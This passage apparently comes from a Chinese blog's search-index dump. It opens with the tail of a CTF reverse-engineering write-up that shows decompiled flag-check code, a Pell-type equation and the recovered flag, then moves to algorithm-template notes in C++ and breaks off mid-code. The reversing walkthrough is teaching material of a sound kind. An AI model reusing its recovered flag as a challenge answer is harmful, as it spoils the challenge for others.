[rbp-38h] BYREF __int64 v36; // [rsp+68h] [rbp-30h] nimRegisterGlobalMarker(sub_BF27A0); nimRegisterGlobalMarker(sub_BF2790); nimRegisterGlobalMarker(sub_BF2780); nimRegisterGlobalMarker(sub_BF2770); nimRegisterGlobalMarker(sub_BF2760); nimRegisterGlobalMarker(sub_BF2750); nimRegisterGlobalMarker(sub_BF2740); nimRegisterGlobalMarker(sub_BF2730); nimRegisterGlobalMarker(sub_BF2720); printf_0(off_BF6DC8, 1i64); v0 = (FILE *)off_BF50C0(0i64); v1 = scanf(v0); v2 = (_QWORD *)v1; if ( v1 ) *(_QWORD *)(v1 - 16) += 8i64; if ( input ) &#123; v3 = *(_QWORD *)(input - 16); v4 = input - 16; *(_QWORD *)(input - 16) = v3 - 8; if ( (unsigned __int64)(v3 - 8) &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v4); &#125; input = (__int64)v2; v5 = 0i64; v6 = sub_BE8FC0(5i64); v7 = v6; if ( !v6 ) &#123; if ( v2 ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; if ( !v2 ) &#123; if ( !v6-&gt;m128i_i64[0] ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; do &#123; if ( v6-&gt;m128i_i64[0] &lt;= (unsigned __int64)v5 ) sub_BEC420(v5, v6-&gt;m128i_i64[0] - 1); if ( *v2 &lt;= (unsigned __int64)v5 ) sub_BEC420(v5, *v2 - 1i64); v6[1].m128i_i8[v5] = *((_BYTE *)v2 + v5 + 16); ++v5; &#125; while ( v5 &lt;= 4 ); if ( v6-&gt;m128i_i64[0] != 5 ) goto error; v8 = v6 + 1; if ( v7[1].m128i_i32[0] != &#x27;galf&#x27; ) //判断输入是否为flag goto error; if ( v8-&gt;m128i_i8[4] != &#x27;&#123;&#x27; ) goto error; v10 = (unsigned __int64 *)input; if ( !input || *(_QWORD *)input != 42i64 || *(_BYTE *)(input + 57) != &#x27;&#125;&#x27; )// 判断长度为42位 并且最后一位是&#125; goto error; v11 = 0i64; input_1 = sub_BE8FC0(18i64); if ( !input_1 ) sub_BEC420(0i64, -1i64); do &#123; v14 = input_1-&gt;m128i_i64[0]; if ( input_1-&gt;m128i_i64[0] &lt;= (unsigned __int64)v11 ) sub_BEC420(v11, v14 - 1); // 跳过 v15 = v11 + 5; if ( v11 + 5 &lt; 0 || v15 &lt; v11 ) sub_BE7F70(v12, v14); // 跳过 if ( *v10 &lt;= v15 ) sub_BEC420(v11 + 5, *v10 - 1); // 跳过 input_1[1].m128i_i8[v11++] = *((_BYTE *)v10 + v15 + 16);// 保存我们输入后去除flag&#123;的后18位 &#125; while ( v11 &lt;= 17 ); v16 = 0i64; str2int(input_1, 10i64, &amp;ll_input_1); //将我们的输入转换为了无符号的long long类型的一个数据 len = (unsigned __int64 *)input; v18 = sub_BE8FC0(18i64); input_2 = v18; if ( !v18 ) &#123; if ( len ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; if ( !len ) &#123; if ( !v18-&gt;m128i_i64[0] ) sub_BEC420(0i64, -1i64); sub_BEC420(23i64, -1i64); &#125; do &#123; v21 = input_2-&gt;m128i_i64[0]; if ( input_2-&gt;m128i_i64[0] &lt;= (unsigned __int64)v16 ) sub_BEC420(v16, v21 - 1); v22 = v16 + 23; if ( v16 + 23 &lt; 0 || v22 &lt; v16 ) sub_BE7F70(v19, v21); if ( *len &lt;= v22 ) sub_BEC420(v16 + 23, *len - 1); input_2[1].m128i_i8[v16++] = *((_BYTE *)len + v22 + 16);// 保存后18位 &#125; while ( v16 &lt;= 17 ); str2int(input_2, 10i64, &amp;ll_input_2); str2int(qword_BF6D80, 10i64, &amp;xmmword_C0C150); str2int(qword_BF6D40, 10i64, &amp;max_num); v31 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C150); //大致可以猜测_mm_lodau_si128是将后面的偏移地址处的数据进行加载，那么可以猜测在这个前后应该会有加密部分 v30 = _mm_loadu_si128((const __m128i *)&amp;ll_input_1); if ( !(unsigned __int8)check(&amp;v31, &amp;v30) ) goto error; v31 = _mm_loadu_si128((const __m128i *)&amp;ll_input_1); v30 = _mm_loadu_si128((const __m128i *)&amp;max_num); if ( !(unsigned __int8)check(&amp;v31, &amp;v30) ) goto error; v32 = 0i64; v33 = 0i64; v31 = (__m128i)ll_input_1; v30 = (__m128i)ll_input_1; func_sqr(&amp;v31, &amp;v30, &amp;v32); v23 = v32; if ( v32 ) *(_QWORD *)(v32 - 16) += 8i64; if ( (_QWORD)xmmword_C0C190 ) &#123; v24 = xmmword_C0C190 - 16; v25 = *(_QWORD *)(xmmword_C0C190 - 16) - 8i64; *(_QWORD *)(xmmword_C0C190 - 16) = v25; if ( v25 &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v24); &#125; *(_QWORD *)&amp;xmmword_C0C190 = v23; v34 = 0ui64; BYTE8(xmmword_C0C190) = v33; v31 = (__m128i)ll_input_2; v30 = (__m128i)ll_input_2; func_sqr(&amp;v31, &amp;v30, &amp;v34); v26 = _mm_load_si128(&amp;v34); v35 = 0i64; v36 = 0i64; v31 = v26; func_mul(&amp;v31, 11i64, &amp;v35); v27 = v35; if ( v35 ) *(_QWORD *)(v35 - 16) += 8i64; if ( (_QWORD)xmmword_C0C120 ) &#123; v28 = xmmword_C0C120 - 16; v29 = *(_QWORD *)(xmmword_C0C120 - 16) - 8i64; *(_QWORD *)(xmmword_C0C120 - 16) = v29; if ( v29 &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v28); &#125; *(_QWORD *)&amp;xmmword_C0C120 = v27; v31 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C190); BYTE8(xmmword_C0C120) = v36; v30 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C120); sub_BF23C0(&amp;v31, &amp;v30, &amp;num_9); str2int(qword_BF6D10, 10i64, &amp;xmmword_C0C180); v31 = _mm_loadu_si128((const __m128i *)&amp;num_9); v30 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C180); if ( (unsigned __int8)sub_BF2500(&amp;v31, &amp;v30) ) &#123; qword_BFA660 = 1i64; &#125; else &#123;error: if ( qword_BFA660 != 1 ) return printf_0(off_BF6CC0, 1i64); &#125; return printf_0(win, 1i64);&#125; $$input1^2-11*(input^2)&#x3D;9$$ 大致流程为输入42位的flag。去除flag{}后分为两个18位的数进行上述运算 采用：www.wolframalpha.com/ 进行求解 y是17位前面补上0得到 1flag&#123;118936021352508390035860559716724409&#125;","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"算法-数据结构","slug":"‘算法-数据结构","date":"2022-07-12T00:05:12.000Z","updated":"2022-07-23T12:53:44.312Z","comments":true,"path":"2022/07/12/‘算法-数据结构/","link":"","permalink":"http://example.com/2022/07/12/%E2%80%98%E7%AE%97%E6%B3%95-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","excerpt":"","text":"链表（数组模拟）new一个结构体效率很低 单链表 邻接表为主（存储数和图） 123456789101112131415161718192021// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点int head, e[N], ne[N], idx;// 初始化void init()&#123; head = -1; idx = 0;&#125;// 在链表头插入一个数avoid insert(int a)&#123; e[idx] = a, ne[idx] = head, head = idx ++ ;&#125;// 将头结点删除，需要保证头结点存在void remove()&#123; head = ne[head];&#125; 双链表 优化某些问题 12345678910111213141516171819202122232425// e[]表示节点的值，l[]表示节点的左指针，r[]表示节点的右指针，idx表示当前用到了哪个节点int e[N], l[N], r[N], idx;// 初始化void init()&#123; //0是左端点，1是右端点 r[0] = 1, l[1] = 0; idx = 2;&#125;// 在节点a的右边插入一个数xvoid insert(int a, int x)&#123; e[idx] = x; l[idx] = a, r[idx] = r[a]; l[r[a]] = idx, r[a] = idx ++ ;&#125;// 删除节点avoid remove(int a)&#123; l[r[a]] = l[a]; r[l[a]] = r[a];&#125; 栈1234567891011121314151617// tt表示栈顶int stk[N], tt = 0;// 向栈顶插入一个数stk[ ++ tt] = x;// 从栈顶弹出一个数tt -- ;// 栈顶的值stk[tt];// 判断栈是否为空if (tt &gt; 0)&#123;&#125; 单调栈 1234567常见模型：找出每个数左边离它最近的比它大/小的数int tt = 0;for (int i = 1; i &lt;= n; i ++ )&#123; while (tt &amp;&amp; check(stk[tt], i)) tt -- ; stk[ ++ tt] = i;&#125; 队列普通队列 1234567891011121314151617// hh 表示队头，tt表示队尾int q[N], hh = 0, tt = -1;// 向队尾插入一个数q[ ++ tt] = x;// 从队头弹出一个数hh ++ ;// 队头的值q[hh];// 判断队列是否为空if (hh &lt;= tt)&#123;&#125; 循环队列 12345678910111213141516171819// hh 表示队头，tt表示队尾的后一个位置int q[N], hh = 0, tt = 0;// 向队尾插入一个数q[tt ++ ] = x;if (tt == N) tt = 0;// 从队头弹出一个数hh ++ ;if (hh == N) hh = 0;// 队头的值q[hh];// 判断队列是否为空if (hh != tt)&#123;&#125; 单调队列 12345678常见模型：找出滑动窗口中的最大值/最小值int hh = 0, tt = -1;for (int i = 0; i &lt; n; i ++ )&#123; while (hh &lt;= tt &amp;&amp; check_out(q[hh])) hh ++ ; // 判断队头是否滑出窗口 while (hh &lt;= tt &amp;&amp; check(q[tt], i)) tt -- ; q[ ++ tt] = i;&#125; KMP字符串匹配算法核心思想：在每次失配时，不是把p串往后移一位，而是把p串往后移动至下一次可以和前面部分匹配的位置，这样就可以跳过大多数的失配步骤。而每次p串移动的步数就是通过查找next[ ]数组确定的。 “非平凡前缀”：指除了最后一个字符以外，一个字符串的全部头部组合。“非平凡后缀”：指除了第一个字符以外，一个字符串的全部尾部组合（简称前后缀） next数组的含义：对next[ j ] ，是p[ 1, j ]串中前缀和后缀相同的最大长度（部分匹配值），即 p[ 1, next[ j ] ] &#x3D; p[ j - next[ j ] + 1, j ]，也就是最长公共长度。（起始位1）next数组的求法是通过模板串自己与自己进行匹配操作得出来的 对 p &#x3D; “abcab” ​ p a b c a b下标 1 2 3 4 5next[ ] 0 0 0 1 2 12345678910111213141516171819202122232425// s[]是长文本，p[]是模式串，n是s的长度，m是p的长度求模式串的Next数组：for (int i = 2, j = 0; i &lt;= m; i ++ )&#123; while (j &amp;&amp; p[i] != p[j + 1]) j = ne[j]; if (p[i] == p[j + 1]) j ++ ; ne[i] = j;&#125;// 匹配for (int i = 1, j = 0; i &lt;= n; i ++ )&#123; while (j &amp;&amp; s[i] != p[j + 1]) j = ne[j]; //如果j有对应p串的元素， 且s[i] != p[j+1], 则失配， 移动p串 //用while是由于移动后可能仍然失配，所以要继续移动直到匹配或整个p串移到后面（j = 0) if (s[i] == p[j + 1]) j ++ ; //当前元素匹配，j移向p串下一位 if (j == m) &#123; j = ne[j]; // 匹配成功后的逻辑 &#125;&#125; Tire树123456789101112131415161718192021222324252627282930int son[N][26], cnt[N], idx;//idx意义同本身的值和指向下一个结点的指针// 0号点既是根节点，又是空节点// son[][]存储树中每个节点的子节点// cnt[]存储以每个节点结尾的单词数量// 插入一个字符串void insert(char *str)&#123; int p = 0; for (int i = 0; str[i]; i ++ ) &#123; int u = str[i] - &#x27;a&#x27;; if (!son[p][u]) son[p][u] = ++ idx; p = son[p][u]; &#125; cnt[p] ++ ;&#125;// 查询字符串出现的次数int query(char *str)&#123; int p = 0; for (int i = 0; str[i]; i ++ ) &#123; int u = str[i] - &#x27;a&#x27;; if (!son[p][u]) return 0; p = son[p][u]; &#125; return cnt[p];&#125; 并查集1.将两个集合合并2.询问两个元素是否在一个集合当中基本原理:每个集合用一棵树来表示。树根的编号就是整个集合的编号。每个节点存储它的父节点，p[x]表示x的父节点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071(1)朴素并查集： int p[N]; //存储每个点的祖宗节点 // 返回x的祖宗节点 int find(int x) &#123;//返回x的祖先节点 + 路径压缩 //祖先节点的父节点是自己本身 if (p[x] != x) //将x的父亲置为x父亲的祖先节点,实现路径的压缩 p[x] = find(p[x]); return p[x]; &#125; // 初始化，假定节点编号是1~n for (int i = 1; i &lt;= n; i ++ ) p[i] = i; //就是将当前数据的父节点指向自己 // 合并a和b所在的两个集合： p[find(a)] = find(b);(2)维护size的并查集： int p[N], size[N]; //p[]存储每个点的祖宗节点, size[]只有祖宗节点的有意义，表示祖宗节点所在集合中的点的数量 // 返回x的祖宗节点 int find(int x) &#123; if (p[x] != x) p[x] = find(p[x]); return p[x]; &#125; // 初始化，假定节点编号是1~n for (int i = 1; i &lt;= n; i ++ ) &#123; p[i] = i; size[i] = 1; &#125; // 合并a和b所在的两个集合： size[find(b)] += size[find(a)]; p[find(a)] = find(b);(3)维护到祖宗节点距离的并查集： int p[N], d[N]; //p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离 // 返回x的祖宗节点 int find(int x) &#123; if (p[x] != x) &#123; int u = find(p[x]); d[x] += d[p[x]]; p[x] = u; &#125; return p[x]; &#125; // 初始化，假定节点编号是1~n for (int i = 1; i &lt;= n; i ++ ) &#123; p[i] = i; d[i] = 0; &#125; // 合并a和b所在的两个集合： p[find(a)] = find(b); d[find(a)] = distance; // 根据具体问题，初始化find(a)的偏移量 堆堆是一种完全二叉树，复习一下完全二叉树的定义，完全二叉树的形式是指除了最后一层之外，其他所有层的结点都是满的，而最后一层的所有结点都靠左边。教材上定义如下: 若设二叉树的深度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第 h 层所有的结点都连续集中在最左边，这就是完全二叉树。 如下图所示，就是一种典型的完全二叉树: 123456789101112131415161718192021222324252627282930313233343536// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1// ph[k]存储第k个插入的点在堆中的位置// hp[k]存储堆中下标是k的点是第几个插入的int h[N], ph[N], hp[N], size;// 交换两个点，及其映射关系void heap_swap(int a, int b)&#123; swap(ph[hp[a]],ph[hp[b]]); swap(hp[a], hp[b]); swap(h[a], h[b]);&#125;void down(int u)&#123; int t = u; if (u * 2 &lt;= size &amp;&amp; h[u * 2] &lt; h[t]) t = u * 2; if (u * 2 + 1 &lt;= size &amp;&amp; h[u * 2 + 1] &lt; h[t]) t = u * 2 + 1 ; if (u != t) &#123; heap_swap(u, t); down(t); &#125;&#125;void up(int u)&#123; while (u / 2 &amp;&amp; h[u] &lt; h[u / 2]) &#123; heap_swap(u, u / 2); u &gt;&gt;= 1; &#125;&#125;// O(n)建堆for (int i = n / 2; i; i -- ) down(i); 一般哈希(1) 拉链法 int h[N], e[N], ne[N], idx; // 向哈希表中插入一个数 void insert(int x) &#123; int k = (x % N + N) % N; e[idx] = x; ne[idx] = h[k]; h[k] = idx ++ ; &#125; // 在哈希表中查询某个数是否存在 bool find(int x) &#123; int k = (x % N + N) % N; for (int i = h[k]; i != -1; i = ne[i]) if (e[i] == x) return true; return false; &#125; (2) 开放寻址法 int h[N]; 1234567891011// 如果x在哈希表中，返回x的下标；如果x不在哈希表中，返回x应该插入的位置int find(int x)&#123; int t = (x % N + N) % N; while (h[t] != null &amp;&amp; h[t] != x) &#123; t ++ ; if (t == N) t = 0; &#125; return t;&#125; 字符串哈希核心思想：将字符串看成P进制数，P的经验值是131或13331，取这两个值的冲突概率低小技巧：取模的数用2^64，这样直接用unsigned long long存储，溢出的结果就是取模的结果 12345678910111213141516typedef unsigned long long ULL;ULL h[N], p[N]; // h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64// 初始化p[0] = 1;for (int i = 1; i &lt;= n; i ++ )&#123; h[i] = h[i - 1] * P + str[i]; p[i] = p[i - 1] * P;&#125;// 计算子串 str[l ~ r] 的哈希值ULL get(int l, int r)&#123; return h[r] - h[l - 1] * p[r - l + 1];&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"keywords":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}]},{"title":"算法基础","slug":"算法基础-快排","date":"2022-07-06T16:00:00.000Z","updated":"2022-07-26T06:55:26.207Z","comments":true,"path":"2022/07/07/算法基础-快排/","link":"","permalink":"http://example.com/2022/07/07/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80-%E5%BF%AB%E6%8E%92/","excerpt":"","text":"STL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100vector, 变长数组，倍增的思想 size() 返回元素个数 empty() 返回是否为空 clear() 清空 front()/back() push_back()/pop_back() begin()/end() [] 支持比较运算，按字典序pair&lt;int, int&gt; first, 第一个元素 second, 第二个元素 支持比较运算，以first为第一关键字，以second为第二关键字（字典序）string，字符串 size()/length() 返回字符串长度 empty() clear() substr(起始下标，(子串长度)) 返回子串 c_str() 返回字符串所在字符数组的起始地址queue, 队列 size() empty() push() 向队尾插入一个元素 front() 返回队头元素 back() 返回队尾元素 pop() 弹出队头元素priority_queue, 优先队列，默认是大根堆 size() empty() push() 插入一个元素 top() 返回堆顶元素 pop() 弹出堆顶元素 定义成小根堆的方式：priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q;stack, 栈 size() empty() push() 向栈顶插入一个元素 top() 返回栈顶元素 pop() 弹出栈顶元素deque, 双端队列 size() empty() clear() front()/back() push_back()/pop_back() push_front()/pop_front() begin()/end() []set, map, multiset, multimap, 基于平衡二叉树（红黑树），动态维护有序序列 size() empty() clear() begin()/end() ++, -- 返回前驱和后继，时间复杂度 O(logn) set/multiset insert() 插入一个数 find() 查找一个数 count() 返回某一个数的个数 erase() (1) 输入是一个数x，删除所有x O(k + logn) (2) 输入一个迭代器，删除这个迭代器 lower_bound()/upper_bound() lower_bound(x) 返回大于等于x的最小的数的迭代器 upper_bound(x) 返回大于x的最小的数的迭代器 map/multimap insert() 插入的数是一个pair erase() 输入的参数是pair或者迭代器 find() [] 注意multimap不支持此操作。 时间复杂度是 O(logn) lower_bound()/upper_bound()unordered_set, unordered_map, unordered_multiset, unordered_multimap, 哈希表 和上面类似，增删改查的时间复杂度是 O(1) 不支持 lower_bound()/upper_bound()， 迭代器的++，--bitset, 圧位 bitset&lt;10000&gt; s; ~, &amp;, |, ^ &gt;&gt;, &lt;&lt; ==, != [] count() 返回有多少个1 any() 判断是否至少有一个1 none() 判断是否全为0 set() 把所有位置成1 set(k, v) 将第k位变成v reset() 把所有位变成0 flip() 等价于~ flip(k) 把第k位取反 快排模板： 12345678910111213141516void quick_sort(int q[], int l, int r)&#123; //递归的终止情况 if(l &gt;= r) return; //第一步：分成子问题 int i = l - 1, j = r + 1, x = q[l + r &gt;&gt; 1]; while(i &lt; j) &#123; do i++; while(q[i] &lt; x); do j--; while(q[j] &gt; x); if(i &lt; j) swap(q[i], q[j]); &#125; //第二步：递归处理子问题 quick_sort(q, l, j), quick_sort(q, j + 1, r); //第三步：子问题合并.快排这一步不需要操作，但归并排序的核心在这一步骤&#125; 例题给定你一个长度为 nn 的整数数列。 请你使用快速排序对这个数列按照从小到大进行排序。 并将排好序的数列按顺序输出。 输入格式输入共两行，第一行包含整数 nn。 第二行包含 nn 个整数（所有整数均在 1∼1091∼109 范围内），表示整个数列。 输出格式输出共一行，包含 nn 个整数，表示排好序的数列。 数据范围1≤n≤1000001≤n≤100000 输入样例：1253 1 2 4 5 输出样例：11 2 3 4 5 解题：1234567891011121314151617181920212223242526272829303132#include&lt;iostream&gt;using namespace std;const int N=1000010;int q[N];void quick_sort(int q[],int l,int r)&#123; if (l&gt;=r)return; int x=q[l+r&gt;&gt;1],i=l-1,j=r+1; while(i&lt;j) &#123; do i++;while(q[i]&lt;x); do j--;while(q[j]&gt;x); if(i&lt;j) swap(q[i],q[j]); &#125; quick_sort(q,l,j); quick_sort(q,j+1,r);&#125;int main()&#123; int n; scanf(&quot;%d&quot;,&amp;n); //scanf比cin速度更快 for (int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); quick_sort (q,0,n-1); for (int i=0;i&lt;n;i++) printf(&quot;%d &quot;,q[i]); return 0;&#125; 归并排序模板 123456789101112131415161718192021void merge_sort(int q[], int l, int r)&#123; //递归的终止情况 if(l &gt;= r) return; //第一步：分成子问题 int mid = l + r &gt;&gt; 1; //第二步：递归处理子问题 merge_sort(q, l, mid ), merge_sort(q, mid + 1, r); //第三步：合并子问题 int k = 0, i = l, j = mid + 1, tmp[r - l + 1]; while(i &lt;= mid &amp;&amp; j &lt;= r) if(q[i] &lt;= q[j]) tmp[k++] = q[i++]; else tmp[k++] = q[j++]; while(i &lt;= mid) tmp[k++] = q[i++]; while(j &lt;= r) tmp[k++] = q[j++]; for(k = 0, i = l; i &lt;= r; k++, i++) q[i] = tmp[k];&#125; 例题同上 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;iostream&gt;using namespace std;const int N=1000010;int q[N],tmp[N];void merge_sort(int q[],int l,int r)&#123; if(l&gt;=r) return; int mid = l + r&gt;&gt;1; merge_sort(q,l,mid); merge_sort(q,mid+1,r); int k=0,i=l,j=mid+1; while(i&lt;=mid &amp;&amp; j&lt;=r) if(q[i]&lt;=q[j]) tmp[k++]=q[i++]; else tmp[k++]=q[j++]; while(i&lt;=mid) tmp[k++]=q[i++]; while(j&lt;=r) tmp[k++]=q[j++]; for (i=l,j=0;i&lt;=r;i++,j++) q[i]=tmp[j]; &#125;int main()&#123; int n;C++ scanf(&quot;%d&quot;,&amp;n); for (int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); merge_sort (q,0,n-1); for (int i=0;i&lt;n;i++) printf(&quot;%d &quot;,q[i]); return 0;&#125; 二分123456789101112131415161718192021222324bool check(int x) &#123;/* ... */&#125; // 检查x是否满足某种性质// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：int bsearch_1(int l, int r)&#123; while (l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if (check(mid)) r = mid; // check()判断mid是否满足性质 else l = mid + 1; &#125; return l;&#125;// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：int bsearch_2(int l, int r)&#123; while (l &lt; r) &#123; int mid = l + r + 1 &gt;&gt; 1; if (check(mid)) l = mid; else r = mid - 1; &#125; return l;&#125; 例题给定一个按照升序排列的长度为 nn 的整数数组，以及 qq 个查询。 对于每个查询，返回一个元素 kk 的起始位置和终止位置（位置从 00 开始计数）。 如果数组中不存在该元素，则返回 -1 -1。 输入格式第一行包含整数 nn 和 qq，表示数组长度和询问个数。 第二行包含 nn 个整数（均在 1∼100001∼10000 范围内），表示完整数组。 接下来 qq 行，每行包含一个整数 kk，表示一个询问元素。 输出格式共 qq 行，每行包含两个整数，表示所求元素的起始位置和终止位置。 如果数组中不存在该元素，则返回 -1 -1。 数据范围1≤n≤1000001≤n≤1000001≤q≤100001≤q≤100001≤k≤100001≤k≤10000 输入样例：123456 31 2 2 3 3 4345 输出样例：1233 45 5-1 -1 exp 在数组中查找某元素，找不到就输出-1，找到了就输出不小于该元素的最小位置和不大于该元素的最大位置。所以，需要写两个二分，一个需要找到&gt;&#x3D;x的第一个数，另一个需要找到&lt;&#x3D;x的最后一个数。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;using namespace std;const int N=1000010;int q[N];int n,m;int main()&#123; scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); while (m--) &#123; int x; scanf(&quot;%d&quot;,&amp;x); int l=0,r=n-1; while (l&lt;r) //找到&lt;=x的第一个数 右边界 &#123; int mid =l+r &gt;&gt;1; if(q[mid]&gt;=x) r=mid; else l=mid+1; &#125; if(q[l]!=x)cout&lt;&lt;&quot;-1 -1&quot;&lt;&lt;endl; else &#123; cout&lt;&lt;l&lt;&lt;&#x27; &#x27;; int l=0,r=n-1; while(l&lt;r) //&gt;=x的最后一个数 左边界 &#123; int mid=l+r+1&gt;&gt;1; if(q[mid]&lt;=x) l=mid; else r=mid-1; &#125; cout&lt;&lt;l&lt;&lt;endl; &#125; &#125; return 0;&#125; 高精1 度减法12345678910111213141516// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0vector&lt;int&gt; sub(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B)&#123; vector&lt;int&gt; C; for (int i = 0, t = 0; i &lt; A.size(); i ++ ) &#123; t = A[i] - t; if (i &lt; B.size()) t -= B[i]; C.push_back((t + 10) % 10); if (t &lt; 0) t = 1; else t = 0; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;&#125; 高精度乘以低精度123456789101112131415// C = A * b, A &gt;= 0, b &gt;= 0vector&lt;int&gt; mul(vector&lt;int&gt; &amp;A, int b)&#123; vector&lt;int&gt; C; int t = 0; for (int i = 0; i &lt; A.size() || t; i ++ ) &#123; if (i &lt; A.size()) t += A[i] * b; C.push_back(t % 10); t /= 10; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back();&#125; 高精度除以低精度12345678910111213141516// A / b = C ... r, A &gt;= 0, b &gt; 0vector&lt;int&gt; div(vector&lt;int&gt; &amp;A, int b, int &amp;r)&#123; vector&lt;int&gt; C; r = 0; for (int i = A.size() - 1; i &gt;= 0; i -- ) &#123; r = r * 10 + A[i]; C.push_back(r / b); r %= b; &#125; reverse(C.begin(), C.end()); while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); r&#125; 前缀和一维 12S[i] = a[1] + a[2] + ... a[i]a[l] + ... + a[r] = S[r] - S[l - 1] 二维 123S[i, j] = 第i行j列格子左上部分所有元素的和以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：S[x2, y2] - S[x1 - 1, y2] - S[x2, y1 - 1] + S[x1 - 1, y1 - 1] 差分一维 1给区间[l, r]中的每个数加上c：B[l] += c, B[r + 1] -= c 二维 12给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c：S[x1, y1] += c, S[x2 + 1, y1] -= c, S[x1, y2 + 1] -= c, S[x2 + 1, y2 + 1] += c ![ 1 ](https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207081703562.png) b[x1][ y1 ] +&#x3D;c ; 对应图1 ,让整个a数组中蓝色矩形面积的元素都加上了c。b[x1,][y2+1]-&#x3D;c ; 对应图2 ,让整个a数组中绿色矩形面积的元素再减去c，使其内元素不发生改变。b[x2+1][y1]- &#x3D;c ; 对应图3 ,让整个a数组中紫色矩形面积的元素再减去c，使其内元素不发生改变。b[x2+1][y2+1]+&#x3D;c; 对应图4,,让整个a数组中红色矩形面积的元素再加上c，红色内的相当于被减了两次，再加上一次c，才能使其恢复。 双指针算法123456789for (int i = 0, j = 0; i &lt; n; i ++ )&#123; while (j &lt; i &amp;&amp; check(i, j)) j ++ ; // 具体问题的逻辑&#125;常见问题分类： (1) 对于一个序列，用两个指针维护一段区间 (2) 对于两个序列，维护某种次序，比如归并排序中合并两个有序序列的操作 离散化12345678910111213141516vector&lt;int&gt; alls; // 存储所有待离散化的值sort(alls.begin(), alls.end()); // 将所有值排序alls.erase(unique(alls.begin(), alls.end()), alls.end()); // 去掉重复元素// 二分求出x对应的离散化的值int find(int x) // 找到第一个大于等于x的位置&#123; int l = 0, r = alls.size() - 1; while (l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if (alls[mid] &gt;= x) r = mid; else l = mid + 1; &#125; return r + 1; // 映射到1, 2, ...n&#125; 例题：假定有一个无限长的数轴，数轴上每个坐标上的数都是 00。 现在，我们首先进行 nn 次操作，每次操作将某一位置 xx 上的数加 cc。 接下来，进行 mm 次询问，每个询问包含两个整数 ll 和 rr，你需要求出在区间 [l,r][l,r] 之间的所有数的和。 输入格式第一行包含两个整数 nn 和 mm。 接下来 nn 行，每行包含两个整数 xx 和 cc。 再接下来 mm 行，每行包含两个整数 ll 和 rr。 输出格式共 mm 行，每行输出一个询问中所求的区间内数字和。 数据范围−109≤x≤109−109≤x≤109,1≤n,m≤1051≤n,m≤105,−109≤l≤r≤109−109≤l≤r≤109,−10000≤c≤10000−10000≤c≤10000 输入样例：12345673 31 23 67 51 34 67 8 输出样例：123805 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;typedef pair&lt;int, int&gt; PII;const int N = 300010;int a[N], s[N];int n, m;vector&lt;int&gt; alls;vector&lt;PII&gt; add, query;int find(int x)&#123; int l = 0, r = alls.size() - 1; while(l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if(alls[mid] &gt;= x) r = mid; else l = mid + 1; &#125; return r + 1;&#125;vector&lt;int&gt;:: iterator unique(vector&lt;int&gt; &amp;a)&#123; int j = 0; for(int i = 0; i &lt; a.size(); i ++) if(!i || a[i] != a[i - 1]) a[j ++ ] = a[i]; return a.begin() + j;&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; m; for(int i = 0; i &lt; n; i ++ ) &#123; int x, c; cin &gt;&gt; x &gt;&gt; c; add.push_back(&#123;x, c&#125;); alls.push_back(x); &#125; for(int i = 0; i &lt; m; i ++ ) &#123; int l, r; cin &gt;&gt; l &gt;&gt; r; query.push_back(&#123;l, r&#125;); 